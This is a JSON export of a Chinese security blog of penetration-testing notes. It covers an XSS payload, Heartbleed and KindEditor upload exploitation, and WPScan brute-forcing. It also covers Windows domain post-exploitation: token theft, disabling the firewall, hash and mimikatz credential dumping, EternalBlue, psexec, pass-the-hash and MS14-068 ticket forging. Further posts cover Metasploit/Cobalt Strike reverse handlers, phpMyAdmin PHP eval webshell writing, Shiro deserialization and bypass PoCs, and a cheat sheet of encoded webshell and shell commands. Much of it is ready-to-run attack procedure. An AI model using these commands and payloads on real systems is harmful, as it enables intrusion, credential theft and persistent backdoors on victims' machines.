xss测试1&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"},{"name":"挖洞","slug":"挖洞","permalink":"http://example.com/tags/%E6%8C%96%E6%B4%9E/"},{"name":"万能密码","slug":"万能密码","permalink":"http://example.com/tags/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/"}]},{"title":"openssl心脏滴血漏洞","slug":"openssl心脏滴血漏洞","date":"2022-05-25T05:13:51.000Z","updated":"2022-05-25T05:31:12.709Z","comments":true,"path":"2022/05/25/openssl心脏滴血漏洞/","permalink":"http://example.com/2022/05/25/openssl%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"openssl心脏滴血漏洞心脏出血漏洞”是指openssl这个开源软件中的一个漏洞，因为该软件使用到一个叫做heartbeat(中文名称为心跳)的扩展，恰恰是这个扩展出现了问题，所以才将这个漏洞形象的称为“心脏出血”； 影响范围OpenSSL 1.0.1版本 漏洞复现nmap -O xxxxx 查看开放端口 nmap xxxx –script&#x3D;vuln nmap -sV -p 8443 –script ssl-heartbleed.nse xxxxxx msf1234search heartbleeduse uxiliary/scanner/ssl/openssl_heartbleed 123设置一下verbose，让verbose为true这样我们才可以看到泄露的64kb数据set verbose true 可以看到一些泄露的数据，假如这是被攻击端正在输入一些私密的数据，我们就有可能获取到这些数据了。","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"openssl","slug":"openssl","permalink":"http://example.com/tags/openssl/"}]},{"title":"wpscan学习使用","slug":"wpscan学习使用","date":"2022-05-25T02:40:57.000Z","updated":"2022-05-25T05:31:12.709Z","comments":true,"path":"2022/05/25/wpscan学习使用/","permalink":"http://example.com/2022/05/25/wpscan%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/","excerpt":"","text":"wpscan学习使用1234wpscan --update 更新漏洞库--url | -u &lt;target url&gt; 要扫描的`WordPress`站点.--force | -f 不检查网站运行的是不是`WordPress`--enumerate | -e [option(s)] 枚举 （1） 扫描wordpress用户wpscan –url http://www.xxxxx.xxx/ –enumerate u （2）扫描主题wpscan –url http://www.xxxxx.xxx/ –enumerate t （3）扫描主题中的漏洞wpscan –url http://www.xxxxx.xxx/ –enumerate vt （4）扫描插件wpscan –url http://www.xxxxx.xxx/ –enumerate p （5）扫描插件中的漏洞wpscan –url http://www.xxxxx.xxx/ –enumerate vp （6）使用WPScan进行暴力破解wpscan –url http://www.xxxxx.xxx/ -e u –wordlist &#x2F;root&#x2F;桌面&#x2F;password.txt -P -U 后面的参数最好使用文件的绝对路径wpscan –url http://www.xxxxx.xxx/ &#x2F;home&#x2F;&#x2F;passwords.txt -U &#x2F;home&#x2F;username.txt （7）api token使用wpscan –url https://www.xxxxx.xxx/ –disable-tls-checks –api-token +获取到的token （8）https 情况下-disable-tls-checks #禁用SSL&#x2F;TLS证书验证。 wpscan –url https://www.xxxxx.xxx/ –enumerate vt –disable-tls-checks","categories":[],"tags":[{"name":"wpscan","slug":"wpscan","permalink":"http://example.com/tags/wpscan/"}]},{"title":"（CVE-2017-1002024）Kindeditor <=4.1.11 上传漏洞","slug":"（CVE-2017-1002024）Kindeditor-4-1-11-上传漏洞","date":"2022-05-25T02:01:52.000Z","updated":"2022-05-25T05:31:12.710Z","comments":true,"path":"2022/05/25/（CVE-2017-1002024）Kindeditor-4-1-11-上传漏洞/","permalink":"http://example.com/2022/05/25/%EF%BC%88CVE-2017-1002024%EF%BC%89Kindeditor-4-1-11-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"（CVE-2017-1002024）Kindeditor &lt;&#x3D;4.1.11 上传漏洞一、漏洞简介漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php&#x2F;asp&#x2F;jsp&#x2F;asp.net,漏洞存在于小于等于kindeditor4.1.11编辑器中 二、漏洞影响Kindeditor &lt;&#x3D;4.1.11 三、复现过程1234567curl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/php/upload_json.php?dir=filecurl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=filecurl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=filecurl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file ```返回值为路径 json文件地址 1234567/asp/upload_json.asp/asp.net/upload_json.ashx/jsp/upload_json.jsp/php/upload_json.php 上传路径 1234567kindeditor/asp/upload_json.asp?dir=filekindeditor/asp.net/upload_json.ashx?dir=filekindeditor/jsp/upload_json.jsp?dir=filekindeditor/php/upload_json.php?dir=file 查看版本信息 1http://www.0-sec.org/kindeditor//kindeditor.js 构造poc1234567891011&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;form name=&quot;form&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;https://xxxxxxxxxxxx/static/school/tool/kindeditor/php/upload_json.php?dir=file&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;imgFile&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 正确的回显 错误的回显","categories":[],"tags":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"},{"name":"Kindeditor","slug":"Kindeditor","permalink":"http://example.com/tags/Kindeditor/"}]},{"title":"beef安装使用","slug":"beef安装使用","date":"2022-05-23T04:44:33.000Z","updated":"2022-05-25T05:31:12.708Z","comments":true,"path":"2022/05/23/beef安装使用/","permalink":"http://example.com/2022/05/23/beef%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/","excerpt":"","text":"安装 1apt-get install beef-xss 启动 cd &#x2F;usr&#x2F;share&#x2F;beef-xss","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"},{"name":"beef","slug":"beef","permalink":"http://example.com/tags/beef/"}]},{"title":"内网渗透学习笔记","slug":"内网渗透学习笔记","date":"2022-05-12T12:45:45.000Z","updated":"2022-05-16T03:21:48.483Z","comments":true,"path":"2022/05/12/内网渗透学习笔记/","permalink":"http://example.com/2022/05/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"map 192.168.44.133 –script vuln 令牌窃取提权123456meterpreter &gt; load incognito //加载incognitometerpreter &gt; getuid //查看当前tokenmeterpreter &gt; list_tokens -u //列出可用tokenmeterpreter &gt; impersonate_token &quot;NT AUTHORITY\\\\SYSTEM&quot; //token窃取，格式为impersonate_token&quot;主机名\\\\用户名&quot;meterpreter &gt; getuid //查看当前tokenmeterpreter &gt; rev2self //返回之前的token 关闭防火墙 netsh advfirewall set allprofiles state off 1.导出hash 12run hashdump run windows/gather/smart_hashdump 2：加载 kiwi模块 12load kiwicreds_all 3.内网漫游 MSF搭建socks代理 · 添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机 · 添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务 注：添加路由一定要在挂代理之前，因为代理需要用到路由功能 route add 0.0.0.0 0.0.0.0 sessions_id route pint 添加socks代理 判断蜜罐123查看监听当前目录: ls判断靶机是否进入蜜罐：run post/windows/gather/checkvm列举安装程序：run post/windows/gather/enum_applications 域信息收集shell中运行chcp 65001 解决乱码 12345678910111213net view #查看局域网内其他主机名net config Workstation #查看计算机名、全名、用户名、系统版本、工作站、域、登录域net user #查看本机用户列表net user /domain #查看域用户net localgroup administrators #查看本地管理员组（通常会有域用户）net view /domain #查看有几个域net user 用户名 /domain #获取指定域用户的信息net group /domain#查看域里面的工作组，查看把用户分了多少组（域控上操作）net group 组名 /domain #查看域中某工作组net group &quot;domain admins&quot; /domain #查看域管理员的名字net group &quot;domain computers&quot; /domain #查看域中的其他主机名net group &quot;doamin controllers&quot; /domain #查看域控制器主机名 内网主机信息收集（内网横向渗透）添加路由后进行扫描 123456MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了。#加载MSFautoroute模块，探测当前机器所有网段信息meterpreter &gt; run post/multi/manage/autoroute#添加目标内网路由meterpreter &gt; run post/multi/manage/autoroute SUBNET=192.168.44.129 ACTION=ADD 内网存活主机探测12后渗透阶段之基于MSF的内网主机探测auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机 内网存活主机端口扫描12345678910111213auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(默认扫描1-10000)auxiliary/scanner/ftp/ftp_version 发现内网ftp服务，基于默认21端口auxiliary/scanner/ssh/ssh_version 内网ssh服务，基于默认22端口auxiliary/scanner/telnet/telnet_version 内网telnet服务，基于默认23端口auxiliary/scanner/dns/dns_amp 发现dns服务，基于默认53端口auxiliary/scanner/http/http_version 发现内网http服务，基于默认80端口auxiliary/scanner/http/title 探测内网http服务的标题auxiliary/scanner/smb/smb_version 内网smb服务，基于默认的445端口auxiliary/scanner/mssql/mssql_schemadump 内网SQLServer服务,基于默认的1433端口auxiliary/scanner/oracle/oracle_hashdump 内网oracle服务,基于默认的1521端口auxiliary/scanner/mysql/mysql_version 内网mysql服务，基于默认3306端口auxiliary/scanner/rdp/rdp_scanner 内网RDP服务，基于默认3389端口auxiliary/scanner/redis/redis_server 内网Redis服务，基于默认6379端口auxiliary/scanner/db2/db2_version 探测内网的db2服务，基于默认的50000端口auxiliary/scanner/netbios/nbname内网主机的netbios名字 123456781. 内网横向探测 获取到一个 cs 的 beacon 后可以目标内网情况和端口开放情况，在 beacon 上右键 -&gt; 目 标 -&gt; 选择 net view 或者 port scan： 可以在菜单栏中，view视窗的targets选项中查看2. 用 cs 的 hashdump 读内存密码：hashdump，用 mimikatz 读注册表密码：logonpasswords。获取相应账户凭证或者： 右键-&gt;Access-&gt;Dump Hashes（需要Administrator权限） 右键-&gt;Access-&gt;Run Mimikatz 可以在凭证栏中查看获取的凭证 内网横向渗透攻击1.MS17-010永恒之蓝1234search ms17-010注意这里的payload必须设置为正向连接 bind_tcpuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp 2.CVE-2019-0708windows RDP协议的漏洞 该漏洞成功率不高，而且极有可能把目标机打成蓝屏 3.psexec攻击获得了域管理员 administrator 的账号密码 使用该域管理员账号密码利用 psexec 登录域内任何一台开启了admin$共享(该共享默认开启) 的主机。 注：由于提示需要修改密码，所以已将 god&#x2F;administrator 的密码改为 Password@ 。 psexec.exe \\192.168.52.138 -u god\\administrator -p Password@ cmd psexec 传递12345678910psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务。获取凭据后对目标网段进行端口存活探测，因为是 psexec 传递登录，这里仅需探测445端口命令：portscan ip网段 端口 扫描协议（arp、icmp、none） 线程例如：portscan 10.10.10.0/24 445 arp 200 IPC连接建立IPC$连接上传木马 建立后可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令。上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。 常用命令: 1234net use \\\\ip\\ipc$ pawword /user:username 建立IPC连接copy hacker.exe \\\\10.10.10.10\\C$\\windows\\temp 复制本地文件到目标服务器copy \\\\10.10.10.10\\C$\\windows\\temp\\hash.txt 复制目标服务器文件到本地 wmic命令执行木马1wmic /node:10.10.10.10 /user:用户名 /password:密码 process call create &quot;目标机中的木马路径&quot; 4.哈希传递攻击只有获得了域管理员的哈希才可以攻击。没有得到明文密码 1234567【哈希传递攻击】在 kerberos、NTLM 认证过程的关键，首先就是基于用户密码 Hash 的加密，所以在域渗透中，无法破解用户密码 Hash 的情况下，也可以直接利用 Hash 来完成认证，达到攻击的目的，这就是 hash 传递攻击（Pass The Hash，简称 PTH）。如果内网主机的本地管理员账户密码相同，那么可以通过 PTH 远程登录到任意一台主机，操作简单、威力无穷。在域环境中，利用哈希传递攻击的渗透方式往往是这样的： 1.获得一台域主机的权限，Dump 内存获得该主机的用户密码 Hash 值； 2.通过哈希传递攻击尝试登录其他主机； 3.继续搜集 Hash 并尝试远程登录，直到获得域管理员账户 Hash，登录域控，最终成功控制整个域。 1sekurlsa::pth /user:administrator /domain: &quot;god.org&quot; /ntlm:c456c606a647ef44b646c44a227917a4 5.MS14-068用于当我们获得了普通域用户的哈希,域控存在MS14-068漏洞 先获取需要利用的域用户的SID值 whoami &#x2F;all 1234567#生成票据TGT_administrator@god.org.ccacheMS14-068.exe -u administrator@god.org -p Password@ -s S-1-5-21-2952760202-1353902439-2381784089-500 -d 192.168.52.138 #MS14-068.exe -u 域用户@dog.org -p 域用户密码 -s 域用户的SID -d 域控ip#在mimikatz中导入票据kerberos::ptc %uA0TGT_administrator@god.org.ccache的路径然后再打开一个cmd窗口尝试访问域控dir \\\\192.168.52.138\\c$ SMB Beacon和psexec传递（msf中的hash传递攻击）123456789101112131415 - 在探测到其他两个内网机器开了445端口的前提下，可以使用SMB beacon获取。相当于在msf里面使用永恒之蓝获取shell。有两种方法- 直接派生，新建一个listener，pyload设置为beacon_smb 在已有的 Beacon 上右键 Spawn(生成会话 / 派生)，选择创建的 smb beacon 的 listerner： 选择后会反弹一个子会话，在 external 的 ip 后面会有一个链接的小图标： 这就是派生的 SMB Beacon，当前没有连接，可以在主 Beacon 上用 link host 连接它，或者unlink host 断开 就是说通过之前的beacon为跳板通过SMB去连接新beacon获取权限shell 可以在视图界面查看图形化连接情况- 前面横向探测已经获取到内网内的其他 Targets 以及读取到的凭证信息，尝试使用 psexec 模块登录其他主机，右键选择一台非域控主机 ROOT-TVI862UBEH 的 psexec 模块：- 在弹出的窗口中选择使用 god.org 的 Administrator 的凭证信息，监听器选择之前创建的smb beacon，会话也选择对应的 smb beacon 的会话：- 成功上线，并返回新的beacon","categories":[],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"msf和cs联动","slug":"msf和cs联动","date":"2022-05-12T12:29:34.000Z","updated":"2022-05-13T13:37:13.301Z","comments":true,"path":"2022/05/12/msf和cs联动/","permalink":"http://example.com/2022/05/12/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/","excerpt":"","text":"cs传shell给msf1.msf 1234use exploit/multi/handlerset payload windows/meterpreter/reverse_httpset lhost 192.168.110.130 set lport 4444 2.cs创建监听器，名字为msf 选择Foreign http 3.cs执行监听器 spawn msf msf传shell给cs cs创建监听器 ​ 选择的是http方式连接 msf派生shell ​ 先把会话放到后台，设置如下。因为cs上设置的为http连接，所以我们下边payload也要对应的设置为reverse_tcp 12345678910#派生一个新的shell给cs，那么msf里面用到的exploit是use exploit/windows/local/payload_inject set payload windows/meterpreter/reverse_http#禁止产生一个新的handlerset disablepayloadhandler true#设置ip端口为cs监听的set LHOST IPset LPORT 端口set session 3run","categories":[],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"cs","slug":"cs","permalink":"http://example.com/tags/cs/"}]},{"title":"kali重新获取ip","slug":"kali重新获取ip","date":"2022-05-12T11:58:31.000Z","updated":"2022-05-13T13:37:13.303Z","comments":true,"path":"2022/05/12/kali重新获取ip/","permalink":"http://example.com/2022/05/12/kali%E9%87%8D%E6%96%B0%E8%8E%B7%E5%8F%96ip/","excerpt":"","text":"1234释放原有ip：#dhclient -r获取新的ip：#dhclient eth0查看ip： # ifconfig查看ip详细信息：#cat /var/lib/dhcp/dhclient.leases","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"http://example.com/tags/kali/"}]},{"title":"phpMyAdmin后台getshell学习笔记","slug":"phpMyAdmin后台getshell学习笔记","date":"2022-05-11T11:56:35.000Z","updated":"2022-05-13T13:37:13.304Z","comments":true,"path":"2022/05/11/phpMyAdmin后台getshell学习笔记/","permalink":"http://example.com/2022/05/11/phpMyAdmin%E5%90%8E%E5%8F%B0getshell%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"PhpMyAdmin后台getshell学习笔记1.into outfile导入木马 首先需要确认网站的绝对路径 1select @@basedir; select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;web路径&#39;; 1234567891011121314151617181920212223 **mysql**高版本中secure_file_pirv会对读写进行限制 ~~~sql show global variables like &#x27;%secure%&#x27;; ~~~ 当`secure_file_priv`为NULL时，表示限制Mysql不允许导入导出。 要想成功，则需要在Mysql文件夹下修改`my.ini` 文件，在[mysqld]内加入`secure_file_priv =&quot;&quot;` 即可。## 2.利用Mysql日志文件mysql5.0以上会创建日志文件1. **general_log** 指的是日志保存状态，ON代表开启 OFF代表关闭；2. **general_log_file** 指的是日志的保存路径。 查看日志状态： ~~~~sql show variables like &#x27;%general%&#x27;; 当开启general时，**所执行的sql语句都会出现在`log`文件**。 修改`general_log_file`的值，执行的sql语句就会对应生成，进而getshell。 需要注意**路径斜杠的方向** 12set global general_log = &#x27;on&#x27;set global general_log_file = &#x27;C:/phpStudy/www/hack.php&#x27; 再次执行，getshell 1select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;","categories":[],"tags":[{"name":"PhpMyAdmin","slug":"PhpMyAdmin","permalink":"http://example.com/tags/PhpMyAdmin/"}]},{"title":"centos安装msf","slug":"centos安装msf","date":"2022-05-08T12:06:54.000Z","updated":"2022-05-09T11:05:53.444Z","comments":true,"path":"2022/05/08/centos安装msf/","permalink":"http://example.com/2022/05/08/centos%E5%AE%89%E8%A3%85msf/","excerpt":"","text":"centos安装msf下载包 1wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run 权限配置 1chmod +x metasploit-latest-linux-x64-installer.run 运行这个文件./metasploit-latest-linux-x64-installer.run 之后基本回车就可以，有选择y&#x2F;n的选y。","categories":[],"tags":[{"name":"centos","slug":"centos","permalink":"http://example.com/tags/centos/"},{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"}]},{"title":"完美解决centos8 appstream问题","slug":"完美解决centos8-appstream问题","date":"2022-05-06T10:57:55.000Z","updated":"2022-05-09T11:05:53.444Z","comments":true,"path":"2022/05/06/完美解决centos8-appstream问题/","permalink":"http://example.com/2022/05/06/%E5%AE%8C%E7%BE%8E%E8%A7%A3%E5%86%B3centos8-appstream%E9%97%AE%E9%A2%98/","excerpt":"","text":"【Centos8】Linux 为 repo ‘AppStream‘ 下载元数据失败、Could not resolve host: mirrors.cloud.aliyuncs.com解决问题： 运行以下命令备份之前的repo文件。 1rename &#x27;.repo&#x27; &#x27;.repo.bak&#x27; /etc/yum.repos.d/*.repo 运行以下命令下载最新的repo文件 12wget https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo -O /etc/yum.repos.d/Centos-vault-8.5.2111.repowget https://mirrors.aliyun.com/repo/epel-archive-8.repo -O /etc/yum.repos.d/epel-archive-8.repo 运行以下命令替换repo文件中的链接，就是这一步出错了 官方的 12sed -i &#x27;s/mirrors.cloud.aliyuncs.com/url_tmp/g&#x27; /etc/yum.repos.d/Centos-vault-8.5.2111.repo &amp;&amp; sed -i &#x27;s/mirrors.aliyun.com/mirrors.cloud.aliyuncs.com/g&#x27; /etc/yum.repos.d/Centos-vault-8.5.2111.repo &amp;&amp; sed -i &#x27;s/url_tmp/mirrors.aliyun.com/g&#x27; /etc/yum.repos.d/Centos-vault-8.5.2111.reposed -i &#x27;s/mirrors.aliyun.com/mirrors.cloud.aliyuncs.com/g&#x27; /etc/yum.repos.d/epel-archive-8.repo http://mirrors.cloud.aliyuncs.com需要替换为http://mirrors.aliyun.com，但是官方提供的命令没替换完，如果有执行官方提供的命令还是不行的话执行下面的命令： 12sed -i &#x27;s/mirrors.cloud.aliyuncs.com/mirrors.aliyun.com/g&#x27; /etc/yum.repos.d/Centos-vault-8.5.2111.repo sed -i &#x27;s/mirrors.cloud.aliyuncs.com/mirrors.aliyun.com/g&#x27; /etc/yum.repos.d/epel-archive-8.repo 运行以下命令重新创建缓存 yum clean all &amp;&amp; yum makecache 执行成果，yum install也可以正常使用了","categories":[],"tags":[{"name":"centos8","slug":"centos8","permalink":"http://example.com/tags/centos8/"}]},{"title":"通用型漏洞学习笔记","slug":"通用型漏洞学习笔记","date":"2022-04-28T01:17:43.000Z","updated":"2022-05-09T11:05:53.454Z","comments":true,"path":"2022/04/28/通用型漏洞学习笔记/","permalink":"http://example.com/2022/04/28/%E9%80%9A%E7%94%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"通用型漏洞学习笔记1.常见的web中间件1iis，shiro，tomcat，apache，strust2,weblogic,jboss 2.shiro漏洞调试环境搭建123shiro-coreshiro-spring-boot-starter 插件12https://github.com/pmiaowu/BurpShiroPassiveScanhttps://github.com/j1anFen/shiro_attack RCE流程12341.fetch rememberMe cookie2.base64-decode3.AES解密（硬编码）4.反序列化 1234567891011cve-2016-4437 # shrio rememberMe反序列化漏洞cve-2016-4437 # shiro Padding oracle attackcve-2016-6802cve-2020-1957cve-2020-11989 # apache shrio 身份验证绕过漏洞cve-2020-13933cve-2020-17523CVE-2019-12422 Shiro &lt;=1.4.2 Padding Oracle Attack RCE (Shiro-721)https://github.com/feihong-cs/ShiroExploit-Deprecated apache shiro 反序列化漏洞分为两种：shiro-550、shiro-721 123456shiro-550 框架提供了记住密码的功能，用户登录成功后会生成经过加密并编码的cookieshiro-721，由于apache shrio cookie中通过aes-128-cbc模式加密的rememberme字段存在问题 影响Apache Shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1版本。  该漏洞需要登录后获取到合法的Cookie:rememberMe=XXX后才可以进行利用，不需要知道服务端密钥 shrio721 rce 123456• 输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。• 使用RememberMe cookie作为Padding Oracle Attack的前缀。• 加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。 • 请求带有新的RememberMe cookie的网站，以执行反序列化攻击。• 攻击者无需知道RememberMe加密的密码密钥。 cve-2016-4437（cve-550）1234567891011121314版本影响：(Shiro&lt;1.4.2 or Shiro&gt;1.4.2)Apache Shiro框架提供RememberMe，用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。因为在反序列化时,不会对其进行过滤,所以如果传入恶意代码将会造成安全问题。在 1.2.4 版本前,shiro中使用默认ASE秘钥（CBC模式）,Key: kPH+bIxk5D2deZiIxcaaaA==,可以直接反序列化执行恶意代码。在1.2.4之后,修复为自定义ASE秘钥（CBC模式）,需要获取到Key才可以进行渗透，通过采集获取常用的github中常用的key值。在1.4.2之后,使用了新的GCM模式进行AES加密,需要使用新的加密算法，并获取到Key才可以进行渗透。漏洞利用需要可用的AES密钥。 cve-2020-195712Shiro 身份验证绕过原理：利用shiro解析uri和spring解析uri之间存在差异来绕过身份验证 漏洞利用 123456789101112131415161718192021222324252627282930311、Shiro&lt;1.5.2 权限绕过POC【URL中加/..;/】目标访问地址【/xxx/hello/aaaa】最终发起请求【/xxx/..;/hello/aaaa】2、CVE-2020-11989 Shiro&lt;1.5.3 权限绕过POC1【URL中加/;/】目标访问地址【/xxx/hello/aaaa】最终发起请求【/;/xxx/hello/aaaa】POC2【将URL中的/二次编码为%25%32%66】目标访问地址【/xxx/hello/aaaa】最终发起请求【/xxx/hello%25%32%66aaaa】漏洞原理：• 当将Apache Shiro与Spring动态控制器一起使用时，访问/;/shiro/admin/page , 就能直接绕过Shiro权限验证影响版本：• Shiro &lt; 1.5.3• 应用不能部署根目录root目录下• Spring控制器中没有另外的权限校验代码3、CVE-2020-13933 Shiro&lt;1.6.0 权限绕过POC【URL加编码后的;】目标访问地址【/xxx/hello/aaaa】最终发起请求【/xxx/hello/%3baaaa】4、CVE-2020-17523 Shiro&lt;1.7.1 权限绕过POC 【URL中加空字符,如%20】目标访问地址【/xxx/hello/aaaa】最终发起请求【/xxx/hello/%20aaaa】 cve-2016-680212345678 漏洞原理：• shiro在路径控制的时候。未能对传入的url编码进行decode解码，导致攻击者可以绕过过滤器，访问被过滤的路径。 影响版本：• shiro &lt; 1.3.2 测试方案：curl --path-as-is -v &quot;192.168.18.155:8080/x/../samples-web1.2.4/account/index.jsp&quot; 修复123添加一个一个InvalidRequestFilter类，该类从全局上对分号，反斜杠和非ASCII字符进行了过滤 123456789101112publie class InvaliaRequestFilter extends AccessCentroLFilter &#123;private static final List&lt;string&gt; SENICOLON = Collection , unmodlfiblelist(Arrays.astList(“;“, “%3b”, “%38”)); private static final List&lt;string&gt; BACKSLASH = Colletiens. unnodlfoblulst(Arrays.asList(“\\\\”,”%5c&quot;, “%5C”)); private boolean blockSemicolon . true; private beolean blockBackslash . true; private boolean blocklonAscll . true ; @Override pretected boolean isAccesAlLowed(ServletReqvest request, ServletResponse response, object appedvatue) throus Exce string uri . nebutila. terttp(request).getRequestUR(); return ! containsSeniceLen(ur1) &amp;&amp; ! containsBocksLash(uri) &amp;&amp; ! containshanAseilcharacter (uri); shrio复现登录，不勾选rememberme 勾选rememberMe 工具利用 3.Apache ssl远程命令执行漏洞4.tomcat cve-2017-12615","categories":[],"tags":[]},{"title":"windows下go get失败问题解决","slug":"windows下go-get失败问题解决","date":"2022-04-23T03:32:56.000Z","updated":"2022-05-09T11:05:53.444Z","comments":true,"path":"2022/04/23/windows下go-get失败问题解决/","permalink":"http://example.com/2022/04/23/windows%E4%B8%8Bgo-get%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/","excerpt":"","text":"使用go get 命令总是报错，发现在国内需要使用需要访问外网 原因是缺少golang.org&#x2F;x&#x2F;net 的依赖包，github已经有托管依赖包，安装下载其依赖包就能解决了： 1234#%GOPATH%---是安装go时设置的变量名称，GOPATH路径mkdir -p %GOPATH%\\src\\golang.org\\x cd %GOPATH%\\src\\golang.org\\x git clone https://github.com/golang/net.git 完成后可以使用go get 命令试一下","categories":[],"tags":[{"name":"-go","slug":"go","permalink":"http://example.com/tags/go/"}]},{"title":"渗透常用命令收集","slug":"渗透常用命令收集","date":"2022-04-23T01:55:02.000Z","updated":"2022-05-09T11:05:53.454Z","comments":true,"path":"2022/04/23/渗透常用命令收集/","permalink":"http://example.com/2022/04/23/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","excerpt":"","text":"command收集渗透中会用到的常用命令 command nmap 存活主机 bypass gobuster dirsearch nbtscan 代理工具 ssh grep mysql sqlmap hydra medusa python交互shell 无交互添加用户 windows 防火墙 frp常用配置 删rdp日志 开3389 文件查找 powershell文件下载 certutil.exe下载 bitsadmin windows信息收集常用命令 at&amp;schtasks&amp;sc横向 impacket包横向命令 反弹shell nc bash perl python php ruby nc java lua powershell 加密shell msf大全 安装 Meterpreter基本命令 基本系统命令 文件系统命令 网络命令 信息收集 提权 获取凭证 假冒令牌 植入后门 cs大全 java命令执行http://www.jackson-t.ca/runtime-exec-payloads.html 1bash -c &#123;echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 写shell在windows中，批处理需要转义字符主要有 “&amp;”，“|”，“&lt;”，“&gt;”等等，转义字符为”^”在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\\47即可。windows命令行最大长度为8191,16进制长度是113898。echo写文件时注意长度。 方法1 1set /p=qaxnb&lt;nul&gt;d:\\1d13.txt 方法2 1echo qaxnb&gt;1we.txt 追加内容 1echo qaxnb&gt;&gt;1we.txt 不换行追加 1set /p=&quot;121d2&quot;&gt;&gt;a.txt 规避空格 123echo.123&gt;&gt;a.txtecho,123&gt;&gt;a.txttype;a.txt 写特殊字符很多的文件，可以用certutil编码再还原。如下还原 12certutil -f -decode 111.txt C:\\\\111.jspcertutil -decodehex 111.txt C:\\\\111.jsp linux下base64 1echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php php的 1echo \\&lt;\\?php eval\\(\\@\\$_POST\\[1\\]\\)\\; \\?\\&gt; &gt;1.php 绕过空格 1234567&gt; &lt; &lt;&gt; 重定向符%09(需要php环境)$&#123;IFS&#125;$IFS$9&#123;cat,flag.php&#125;%20%09 nmap1nmap -sn 10.11.1.0/24 1nmap -sV -p- 10.11.1.0 1nmap 10.11.1.0 --script vuln 1nmap -p445 10.11.1.0 --script smb-vuln-ms17-010 1nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk &#x27;&#123;print $5&#125;&#x27; | grep -v &quot;latency).&quot; &gt;ok_ip.txt 